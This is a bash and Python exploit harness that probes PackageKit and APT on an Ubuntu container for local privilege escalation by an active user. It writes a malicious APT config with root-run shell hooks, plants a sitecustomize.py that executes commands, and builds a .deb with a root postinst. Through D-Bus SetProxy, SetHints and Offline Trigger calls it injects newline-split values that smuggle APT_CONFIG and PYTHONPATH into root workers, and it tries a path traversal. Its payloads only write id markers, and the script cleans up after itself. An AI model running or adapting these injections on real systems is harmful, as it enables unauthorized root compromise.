#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-apt-active-root-worker-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

echo "PackageKit/APT active-user root-worker probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

work=/tmp/packagekit-apt-active-root-worker
home=/home/selfauth
profile="$home/.bash_profile"
profile_bak="$work/bash_profile.backup"
profile_had="$work/bash_profile.had"
console=8
evil_apt=/tmp/pkapt-worker.conf
root_marker=/root/packagekit_apt_active_root_worker_root
monitor_pid=

backup_offline_state() {
  mkdir -p "$work/original"
  : > "$work/original/manifest"
  for p in /system-update \
           /var/lib/PackageKit/offline-update-action \
           /var/lib/PackageKit/offline-update-competed \
           /var/lib/PackageKit/prepared-update \
           /var/lib/PackageKit/prepared-upgrade; do
    if [ -L "$p" ]; then
      printf 'symlink %s %s\n' "$p" "$(readlink "$p")" >> "$work/original/manifest"
    elif [ -e "$p" ]; then
      rel="${p#/}"
      mkdir -p "$work/original/$(dirname "$rel")"
      cp -a "$p" "$work/original/$rel"
      printf 'file %s\n' "$p" >> "$work/original/manifest"
    else
      printf 'missing %s\n' "$p" >> "$work/original/manifest"
    fi
  done
}

restore_offline_state() {
  set +e
  for p in /system-update \
           /var/lib/PackageKit/offline-update-action \
           /var/lib/PackageKit/offline-update-competed \
           /var/lib/PackageKit/prepared-update \
           /var/lib/PackageKit/prepared-upgrade; do
    rm -f "$p"
  done
  [ -f "$work/original/manifest" ] || return 0
  while read -r kind p rest; do
    case "$kind" in
      file)
        rel="${p#/}"
        mkdir -p "$(dirname "$p")"
        cp -a "$work/original/$rel" "$p"
        ;;
      symlink)
        ln -s "$rest" "$p"
        ;;
    esac
  done < "$work/original/manifest"
}

cleanup_target() {
  set +e
  if [ -n "${monitor_pid:-}" ]; then
    kill "$monitor_pid" 2>/dev/null || true
    wait "$monitor_pid" 2>/dev/null || true
  fi
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
  if [ -e "$profile_had" ] && [ -e "$profile_bak" ]; then
    cp -a "$profile_bak" "$profile"
    chown selfauth:selfauth "$profile"
  else
    rm -f "$profile"
  fi
  restore_offline_state
  python3 - <<'PY' >/dev/null 2>&1 || true
import sqlite3
p = "/var/lib/PackageKit/transactions.db"
try:
    con = sqlite3.connect(p)
    con.execute("""delete from proxy where uid=1002 and (
        proxy_http like '%PKAPT_%' or proxy_https like '%PKAPT_%' or
        proxy_ftp like '%PKAPT_%' or proxy_socks like '%PKAPT_%' or
        no_proxy like '%PKAPT_%' or pac like '%PKAPT_%' or
        (coalesce(proxy_http,'')='' and coalesce(proxy_https,'')='' and
         coalesce(proxy_ftp,'')='' and coalesce(proxy_socks,'')='' and
         coalesce(no_proxy,'')='' and coalesce(pac,'')='')
    )""")
    con.commit()
except Exception:
    pass
PY
  rm -f "$evil_apt"
  rm -f "$root_marker" "$root_marker".*
  dpkg -r packagekit-apt-active-root-worker >/dev/null 2>&1 || true
  rm -rf "$work"
  rm -f /var/cache/PackageKit/downloads/*packagekit-apt-active-root-worker* 2>/dev/null || true
  systemctl restart packagekit.service >/dev/null 2>&1 || true
  systemctl reset-failed packagekit.service polkit.service dbus.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

echo "== target/default proof =="
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
id selfauth
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \
  apt dbus polkitd systemd dpkg debconf python3-gi 2>&1 | sort || true
echo
echo "== service and file roots =="
systemctl cat packagekit.service packagekit-offline-update.service --no-pager
for p in /var/lib/PackageKit /var/lib/PackageKit/transactions.db /var/cache/PackageKit \
         /var/cache/PackageKit/downloads /etc/apt /etc/apt/apt.conf.d \
         /var/lib/apt/lists /var/lib/apt/lists/partial /var/cache/apt/archives/partial; do
  [ -e "$p" ] || [ -L "$p" ] && stat -Lc '%A %U:%G %F %s %n -> %N' "$p" || echo "MISSING $p"
done
echo
echo "== active PackageKit polkit defaults =="
python3 - <<'PY'
import xml.etree.ElementTree as ET
ids = [
    "org.freedesktop.packagekit.system-sources-refresh",
    "org.freedesktop.packagekit.system-network-proxy-configure",
    "org.freedesktop.packagekit.trigger-offline-update",
    "org.freedesktop.packagekit.trigger-offline-upgrade",
    "org.freedesktop.packagekit.clear-offline-update",
    "org.freedesktop.packagekit.package-install-untrusted",
    "org.freedesktop.packagekit.system-update",
    "org.freedesktop.packagekit.system-sources-configure",
]
root = ET.parse("/usr/share/polkit-1/actions/org.freedesktop.packagekit.policy").getroot()
by_id = {a.attrib.get("id"): a for a in root.findall("action")}
for aid in ids:
    d = by_id[aid].find("defaults")
    vals = {c.tag: (c.text or "").strip() for c in list(d)}
    print(f"{aid}\tany={vals.get('allow_any')}\tinactive={vals.get('allow_inactive')}\tactive={vals.get('allow_active')}")
PY
echo
echo "== PackageKit methods of interest =="
grep -R -n 'method name="SetProxy"\|method name="SetHints"\|method name="RefreshCache"\|method name="GetUpdates"\|method name="InstallFiles"\|method name="UpdatePackages"\|method name="RepoEnable"\|method name="RepoSetData"\|method name="Trigger"\|method name="TriggerUpgrade"\|method name="Cancel"\|method name="GetPrepared"\|method name="ClearResults"' \
  /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit*.xml
echo
echo "== apt hooks =="
grep -R -n 'Pre-Invoke\|Post-Invoke\|DPkg::\|Acquire::\|PackageKit\|appstreamcli\|cnf-update-db\|update-motd' \
  /etc/apt/apt.conf.d /usr/lib/apt/apt.systemd.daily 2>/dev/null || true

rm -rf "$work"
install -d -o selfauth -g selfauth -m 0700 "$work"
backup_offline_state
rm -f "$root_marker" "$root_marker".* "$evil_apt"
loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true
if [ -e "$profile" ]; then
  cp -a "$profile" "$profile_bak"
  touch "$profile_had"
fi

cat > "$evil_apt" <<EOF
APT::Update::Pre-Invoke { "/bin/sh -c 'id > $root_marker.pre'"; };
APT::Update::Post-Invoke-Success { "/bin/sh -c 'id > $root_marker.post'"; };
DPkg::Pre-Install-Pkgs { "/bin/sh -c 'id > $root_marker.dpkgpre'"; };
DPkg::Post-Invoke { "/bin/sh -c 'id > $root_marker.dpkgpost'"; };
EOF
chmod 0644 "$evil_apt"

install -d -o selfauth -g selfauth -m 0755 "$work/py"
cat > "$work/py/sitecustomize.py" <<PY
import os
os.system("id > $root_marker.pythonpath")
PY
chown selfauth:selfauth "$work/py/sitecustomize.py"
chmod 0644 "$work/py/sitecustomize.py"

runuser -u selfauth -- bash <<'BUILD_DEB'
set -Eeuo pipefail
work=/tmp/packagekit-apt-active-root-worker
pkg="$work/pkg"
deb="$work/packagekit-apt-active-root-worker.deb"
rm -rf "$pkg"
mkdir -p "$pkg/DEBIAN" "$pkg/usr/share/packagekit-apt-active-root-worker"
cat > "$pkg/DEBIAN/control" <<'EOF'
Package: packagekit-apt-active-root-worker
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: PackageKit APT Probe <root@example.invalid>
Description: PackageKit APT active root worker probe package
EOF
cat > "$pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
id > /root/packagekit_apt_active_root_worker_root.postinst
exit 0
EOF
chmod 0755 "$pkg/DEBIAN/postinst"
printf 'packagekit apt active root worker\n' > "$pkg/usr/share/packagekit-apt-active-root-worker/payload.txt"
dpkg-deb --build "$pkg" "$deb" >/dev/null
ls -l "$deb"
BUILD_DEB

cat > "$work/root_monitor.py" <<'PYROOT'
#!/usr/bin/env python3
import os
import time

needles = (
    b"PKAPT_",
    b"packagekit-apt-active-root-worker",
    b"APT_CONFIG",
    b"APT::",
    b"Acquire::",
    b"DPkg::",
    b"DEBIAN_FRONTEND",
    b"DEBCONF_PIPE",
    b"http_proxy",
    b"https_proxy",
    b"ftp_proxy",
    b"no_proxy",
    b"LANG",
    b"LC_",
    b"LANGUAGE",
    b"PYTHONPATH",
)
cmd_needles = (
    "packagekitd",
    "/usr/lib/apt/",
    "apt-key",
    "apt-helper",
    "apt-config",
    "dpkg",
    "debconf",
    "gpgv",
    "appstreamcli",
    "cnf-update-db",
    "update-motd-updates-available",
    "gdbus",
)
seen = set()
end = time.time() + 520

def read(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return b""

while time.time() < end:
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        base = "/proc/" + name
        cmd_raw = read(base + "/cmdline")
        if not cmd_raw:
            continue
        cmd = cmd_raw.replace(b"\0", b" ").decode("utf-8", "replace")
        if not any(x in cmd for x in cmd_needles):
            continue
        env = read(base + "/environ")
        items = [x for x in env.split(b"\0") if x and any(n in x for n in needles)]
        if not items:
            continue
        if "packagekitd" not in cmd and not any(
            b"PKAPT_" in x or b"pkapt-worker" in x or b"packagekit-apt-active-root-worker" in x
            for x in items
        ):
            continue
        try:
            st = os.stat(base)
            uid = st.st_uid
        except Exception:
            uid = -1
        key = (name, tuple(items))
        if key in seen:
            continue
        seen.add(key)
        print(f"ENV_SNAPSHOT pid={name} uid={uid} cmd={cmd!r}", flush=True)
        separate = {}
        for item in items:
            for var in (b"APT_CONFIG=", b"PYTHONPATH=", b"PKAPT_", b"DEBCONF_PIPE="):
                if item.startswith(var):
                    separate[var.decode("ascii", "ignore").rstrip("=")] = 1
            print(f"  ENV_ITEM {item!r}", flush=True)
        print("  SEPARATE_FLAGS " + " ".join(f"{k}={v}" for k, v in sorted(separate.items())), flush=True)
    time.sleep(0.03)
PYROOT
chmod 0755 "$work/root_monitor.py"

cat > "$work/active_driver.py" <<'PYACTIVE'
#!/usr/bin/env python3
import os
import socket
import sqlite3
import stat
import threading
import time
import traceback

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"
OFFLINE = "org.freedesktop.PackageKit.Offline"
PROPS = "org.freedesktop.DBus.Properties"
ONLY_DOWNLOAD = 8
SIMULATE = 4
WORK = "/tmp/packagekit-apt-active-root-worker"
EVIL_APT = "/tmp/pkapt-worker.conf"
DEB = os.path.join(WORK, "packagekit-apt-active-root-worker.deb")

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

def call(path, iface, method, params=None, timeout=30000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)

def print_header(title):
    print(f"\n## {title}", flush=True)

class FakeProxy:
    def __init__(self):
        self.count = 0
        self.lines = []
        self.stop = threading.Event()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(32)
        self.sock.settimeout(0.25)
        self.port = self.sock.getsockname()[1]
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        print(f"PROXY_READY port={self.port}", flush=True)

    def _loop(self):
        while not self.stop.is_set():
            try:
                c, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(c, addr), daemon=True).start()

    def _handle(self, c, addr):
        try:
            c.settimeout(2)
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 65536:
                chunk = c.recv(4096)
                if not chunk:
                    break
                data += chunk
            self.count += 1
            text = data.decode("latin1", "replace")
            first = text.splitlines()[0] if text.splitlines() else ""
            self.lines.append(first)
            print(f"PROXY_HIT addr={addr} first={first!r}", flush=True)
            for line in text.splitlines():
                low = line.lower()
                if low.startswith(("host:", "proxy-authorization:", "authorization:", "user-agent:")):
                    print(f"PROXY_HEADER {line!r}", flush=True)
            time.sleep(1.5)
            body = b"PKAPT_WORKER_INVALID_REPOSITORY_METADATA\nAPT::Update::Pre-Invoke { \"id\"; };\n"
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            c.sendall(resp)
        except Exception as exc:
            print(f"PROXY_ERROR {exc!r}", flush=True)
        finally:
            try:
                c.close()
            except Exception:
                pass

    def close(self):
        self.stop.set()
        try:
            s = socket.create_connection(("127.0.0.1", self.port), timeout=0.2)
            s.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1)
        print(f"PROXY_COUNT count={self.count} lines={self.lines!r}", flush=True)

class FrontendSocket:
    def __init__(self, path):
        self.path = path
        self.events = []
        self.stop = threading.Event()
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(path)
        self.sock.listen(8)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        print(f"FRONTEND_READY path={path!r}", flush=True)

    def _loop(self):
        while not self.stop.is_set():
            try:
                c, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                c.settimeout(1)
                data = c.recv(4096)
                self.events.append(data)
                print(f"FRONTEND_HIT data={data!r}", flush=True)
            except Exception as exc:
                print(f"FRONTEND_ERROR {exc!r}", flush=True)
            finally:
                try:
                    c.close()
                except Exception:
                    pass

    def close(self):
        self.stop.set()
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.connect(self.path)
            s.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1)
        print(f"FRONTEND_COUNT count={len(self.events)} events={self.events!r}", flush=True)
        try:
            os.unlink(self.path)
        except Exception:
            pass

def db_snapshot(label):
    print_header(f"transaction db {label}")
    p = "/var/lib/PackageKit/transactions.db"
    try:
        st = os.stat(p)
        print(f"DB_STAT mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid} gid={st.st_gid} size={st.st_size}", flush=True)
        con = sqlite3.connect(f"file:{p}?mode=ro", uri=True)
        for tbl in ("config", "last_action", "proxy", "transactions"):
            try:
                rows = list(con.execute(f"select * from {tbl} order by 1 limit 12"))
                print(f"DB_TABLE {tbl} rows={len(rows)}", flush=True)
                for row in rows:
                    print(f"DB_ROW {tbl} {row!r}", flush=True)
            except Exception as exc:
                print(f"DB_ERR {tbl} {exc!r}", flush=True)
    except Exception as exc:
        print(f"DB_OPEN_ERROR {exc!r}", flush=True)

def offline_props(label):
    print_header(f"offline props {label}")
    try:
        props = call(ROOT, PROPS, "GetAll", GLib.Variant("(s)", (OFFLINE,)), 5000).unpack()[0]
        for k, v in props.items():
            print(f"OFFLINE_PROP {k}={v}", flush=True)
    except Exception as exc:
        print(f"OFFLINE_PROPS_ERROR {exc!r}", flush=True)

def show_offline_files(label):
    print_header(f"offline files {label}")
    for p in ("/system-update", "/var/lib/PackageKit/offline-update-action",
              "/var/lib/PackageKit/offline-update-competed", "/var/lib/PackageKit/prepared-update",
              "/var/lib/PackageKit/prepared-upgrade"):
        try:
            st = os.lstat(p)
            mode = oct(stat.S_IMODE(st.st_mode))
            if stat.S_ISLNK(st.st_mode):
                print(f"OFFLINE_FILE {p} symlink mode={mode} target={os.readlink(p)!r}", flush=True)
            elif stat.S_ISREG(st.st_mode):
                data = open(p, "rb").read(200)
                print(f"OFFLINE_FILE {p} file mode={mode} uid={st.st_uid} gid={st.st_gid} size={st.st_size} data={data!r}", flush=True)
            else:
                print(f"OFFLINE_FILE {p} type={st.st_mode} mode={mode}", flush=True)
        except FileNotFoundError:
            print(f"OFFLINE_FILE {p} missing", flush=True)
        except PermissionError as exc:
            print(f"OFFLINE_FILE {p} permission_error={exc!r}", flush=True)

def auth_snapshot():
    print_header("active authorization")
    for aid in (
        "org.freedesktop.packagekit.system-sources-refresh",
        "org.freedesktop.packagekit.system-network-proxy-configure",
        "org.freedesktop.packagekit.trigger-offline-update",
        "org.freedesktop.packagekit.trigger-offline-upgrade",
        "org.freedesktop.packagekit.clear-offline-update",
        "org.freedesktop.packagekit.package-install-untrusted",
        "org.freedesktop.packagekit.system-update",
        "org.freedesktop.packagekit.system-sources-configure",
    ):
        try:
            val = call(ROOT, PK, "CanAuthorize", GLib.Variant("(s)", (aid,)), 5000).unpack()[0]
            print(f"CAN_AUTHORIZE {aid} -> {val}", flush=True)
        except Exception as exc:
            print(f"CAN_AUTHORIZE_ERROR {aid} {exc!r}", flush=True)

def run_tx(label, method, params, hints=None, timeout_ms=10000, wait_s=45):
    print_header(f"tx {label}")
    packages = []
    try:
        tx = call(ROOT, PK, "CreateTransaction", None, 10000).unpack()[0]
        print(f"TX_PATH {label} {tx}", flush=True)
        if hints:
            try:
                call(tx, TX, "SetHints", GLib.Variant("(as)", (hints,)), 10000)
                print(f"SET_HINTS_OK {label} {hints!r}", flush=True)
            except GLib.Error as exc:
                print(f"SET_HINTS_ERROR {label} {exc.message}", flush=True)
        done = {"value": False}
        def sig(_conn, _sender, _path, _iface, signal, signal_params):
            unpacked = signal_params.unpack()
            print(f"TX_SIGNAL {label} {signal} {unpacked!r}", flush=True)
            if signal == "Package" and len(unpacked) >= 2:
                packages.append(unpacked[1])
            if signal in ("Finished", "ErrorCode"):
                done["value"] = True
                GLib.timeout_add(500, loop.quit)
        sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, sig)
        try:
            call(tx, TX, method, params, timeout_ms)
            print(f"TX_METHOD_OK {label} {method}", flush=True)
        except GLib.Error as exc:
            print(f"TX_METHOD_ERROR {label} {method} {exc.message}", flush=True)
            conn.signal_unsubscribe(sub)
            return packages
        loop = GLib.MainLoop()
        GLib.timeout_add_seconds(wait_s, loop.quit)
        loop.run()
        conn.signal_unsubscribe(sub)
        print(f"TX_DONE {label} done={done['value']} packages={packages[:10]!r} package_count={len(packages)}", flush=True)
        return packages
    except Exception:
        print(f"TX_EXCEPTION {label}", flush=True)
        traceback.print_exc()
        return packages

def offline_call(label, method, params=None):
    print_header(f"offline call {label}")
    try:
        ret = call(ROOT, OFFLINE, method, params, 10000)
        print(f"OFFLINE_CALL_OK {label} {method} -> {ret.unpack() if ret else None}", flush=True)
    except GLib.Error as exc:
        print(f"OFFLINE_CALL_ERROR {label} {method} {exc.message}", flush=True)

def set_proxy(http, https="", ftp="", socks="", no_proxy="", pac=""):
    print_header("SetProxy")
    try:
        call(ROOT, PK, "SetProxy", GLib.Variant("(ssssss)", (http, https, ftp, socks, no_proxy, pac)), 10000)
        print(f"SET_PROXY_OK http={http!r} https={https!r} no_proxy={no_proxy!r} pac={pac!r}", flush=True)
    except GLib.Error as exc:
        print(f"SET_PROXY_ERROR {exc.message}", flush=True)

def default_mode():
    print_header("session")
    print(f"uid={os.getuid()} gid={os.getgid()} tty={os.ttyname(0) if os.isatty(0) else 'notty'}", flush=True)
    print(f"XDG_SESSION_ID={os.environ.get('XDG_SESSION_ID')}", flush=True)
    os.system(f"loginctl show-session {os.environ.get('XDG_SESSION_ID','')} -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote")
    auth_snapshot()
    db_snapshot("before")
    offline_props("default-before")
    show_offline_files("default-before")

    frontend_path = os.path.join(WORK, "frontend\nPKAPT_FRONTEND_SPLIT=1")
    frontend = FrontendSocket(frontend_path)
    proxy = FakeProxy()
    proxy_url = f"http://127.0.0.1:{proxy.port}/\nAPT_CONFIG={EVIL_APT}\nPKAPT_PROXY_SPLIT=1\nAcquire::http::Proxy::ports.ubuntu.com=http://127.0.0.1:{proxy.port}/"
    hints = [
        f"locale=C.UTF-8\nAPT_CONFIG={EVIL_APT}\nPYTHONPATH={WORK}/py\nPKAPT_LOCALE_SPLIT=1",
        "interactive=true",
        "background=false",
        "cache-age=1",
        f"frontend-socket={frontend_path}",
        f"packagekit-apt-active-root-worker=x\nAPT_CONFIG={EVIL_APT}\nPKAPT_UNKNOWN_SPLIT=1",
    ]
    set_proxy(proxy_url, proxy_url, "", "", "localhost\nPKAPT_NO_PROXY_SPLIT=1", f"file://{WORK}/proxy.pac\nPKAPT_PAC_SPLIT=1")
    db_snapshot("after-setproxy")
    run_tx("refresh-cache-force", "RefreshCache", GLib.Variant("(b)", (True,)), hints, wait_s=55)
    packages = run_tx("get-updates", "GetUpdates", GLib.Variant("(t)", (0,)), hints, wait_s=35)
    if packages:
        run_tx("updatepackages-only-download-first", "UpdatePackages", GLib.Variant("(tas)", (ONLY_DOWNLOAD, packages[:1])), hints, wait_s=55)
    else:
        print("NO_UPDATE_PACKAGES_FOR_ONLY_DOWNLOAD", flush=True)
    run_tx("installfiles-only-download-local", "InstallFiles", GLib.Variant("(tas)", (ONLY_DOWNLOAD, [DEB])), hints, wait_s=35)
    run_tx("installfiles-real-local", "InstallFiles", GLib.Variant("(tas)", (0, [DEB])), hints, wait_s=20)
    offline_props("after-default-transactions")
    show_offline_files("after-default-transactions")
    offline_call("getprepared-default", "GetPrepared")
    offline_call("trigger-default-no-seed", "Trigger", GLib.Variant("(s)", ("reboot",)))
    show_offline_files("after-trigger-default-no-seed")
    offline_call("cancel-default", "Cancel")
    show_offline_files("after-cancel-default")
    set_proxy("", "", "", "", "", "")
    db_snapshot("after-clear-proxy")
    proxy.close()
    frontend.close()

def seeded_mode():
    print_header("seeded offline session")
    print(f"uid={os.getuid()} gid={os.getgid()} tty={os.ttyname(0) if os.isatty(0) else 'notty'}", flush=True)
    print(f"XDG_SESSION_ID={os.environ.get('XDG_SESSION_ID')}", flush=True)
    os.system(f"loginctl show-session {os.environ.get('XDG_SESSION_ID','')} -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote")
    auth_snapshot()
    offline_props("seeded-before")
    show_offline_files("seeded-before")
    offline_call("getprepared-seeded", "GetPrepared")
    for action in ("reboot\nAPT_CONFIG=/tmp/pkapt-worker.conf\nPKAPT_OFFLINE_SPLIT=1", "power-off/../../root", "", "reboot", "power-off"):
        offline_call(f"trigger-seeded-action-{action!r}", "Trigger", GLib.Variant("(s)", (action,)))
        offline_props(f"after-trigger-{action!r}")
        show_offline_files(f"after-trigger-{action!r}")
        offline_call(f"cancel-after-{action!r}", "Cancel")
        show_offline_files(f"after-cancel-{action!r}")
    offline_call("trigger-upgrade-seeded", "TriggerUpgrade", GLib.Variant("(s)", ("reboot",)))
    offline_props("seeded-after")

mode = os.environ.get("PKAPT_MODE", "default")
try:
    if mode == "seeded":
        seeded_mode()
    else:
        default_mode()
except Exception:
    traceback.print_exc()
PYACTIVE
chmod 0755 "$work/active_driver.py"
chown -R selfauth:selfauth "$work"

"$work/root_monitor.py" > "$work/root-monitor.out" 2>&1 &
monitor_pid=$!

run_active_login() {
  local mode="$1"
  local out="$work/${mode}-openvt.out"
  cat > "$profile" <<EOF
#!/bin/bash
export PKAPT_MODE=$mode
python3 "$work/active_driver.py" > "$work/${mode}-user.out" 2>&1
exit
EOF
  chown selfauth:selfauth "$profile"
  chmod 0644 "$profile"
  systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true
  timeout 260 openvt -c "$console" -s -f -w -- /bin/login -f selfauth > "$out" 2>&1 || true
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
}

echo
echo "== active default PackageKit/APT run =="
systemctl restart packagekit.service >/dev/null 2>&1 || true
run_active_login default

echo
echo "== root seeded offline setup for fixed-path semantics =="
systemctl restart packagekit.service >/dev/null 2>&1 || true
rm -f /system-update /var/lib/PackageKit/offline-update-action /var/lib/PackageKit/offline-update-competed /var/lib/PackageKit/prepared-update /var/lib/PackageKit/prepared-upgrade
cat > /var/lib/PackageKit/prepared-update <<'EOF'
packagekit-apt-active-root-worker;1.0;all;seeded
PKAPT_SEEDED_PREPARED_UPDATE
EOF
chmod 0644 /var/lib/PackageKit/prepared-update
ls -l /var/lib/PackageKit/prepared-update
cat /var/lib/PackageKit/prepared-update
run_active_login seeded

if [ -n "${monitor_pid:-}" ]; then
  kill "$monitor_pid" 2>/dev/null || true
  wait "$monitor_pid" 2>/dev/null || true
  monitor_pid=
fi

echo
echo "== active default user output =="
cat "$work/default-user.out" 2>&1 || true
echo
echo "== active seeded user output =="
cat "$work/seeded-user.out" 2>&1 || true
echo
echo "== root worker environment monitor =="
cat "$work/root-monitor.out" 2>&1 || true
echo
echo "== final transaction database snapshot =="
python3 - <<'PY'
import os
import sqlite3
p = "/var/lib/PackageKit/transactions.db"
st = os.stat(p)
print(f"DB_STAT mode={oct(st.st_mode & 0o777)} uid={st.st_uid} gid={st.st_gid} size={st.st_size}")
con = sqlite3.connect(p)
for tbl in ("config", "last_action", "proxy", "transactions"):
    rows = list(con.execute(f"select * from {tbl} order by 1 limit 40"))
    print(f"DB_TABLE {tbl} rows={len(rows)}")
    for row in rows:
        print(f"DB_ROW {tbl} {row!r}")
PY
echo
echo "== root proof checks =="
for p in "$root_marker" "$root_marker".pre "$root_marker".post "$root_marker".dpkgpre "$root_marker".dpkgpost "$root_marker".postinst "$root_marker".pythonpath; do
  if [ -e "$p" ]; then
    echo "ROOT_MARKER_PRESENT $p"
    ls -l "$p"
    cat "$p"
  else
    echo "ROOT_MARKER_ABSENT $p"
  fi
done
echo
echo "== offline files before cleanup =="
for p in /system-update /var/lib/PackageKit/offline-update-action /var/lib/PackageKit/offline-update-competed /var/lib/PackageKit/prepared-update /var/lib/PackageKit/prepared-upgrade; do
  if [ -L "$p" ]; then
    echo "OFFLINE_BEFORE_CLEANUP symlink $p -> $(readlink "$p")"
  elif [ -e "$p" ]; then
    ls -l "$p"
    sed -n '1,20p' "$p" 2>/dev/null || true
  else
    echo "OFFLINE_BEFORE_CLEANUP missing $p"
  fi
done
echo
echo "== PackageKit journal during probe =="
journalctl -u packagekit.service --no-pager -n 120 || true
echo
echo "== cleanup health preview =="
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET_SCRIPT

echo
echo "Host log: $LOG"
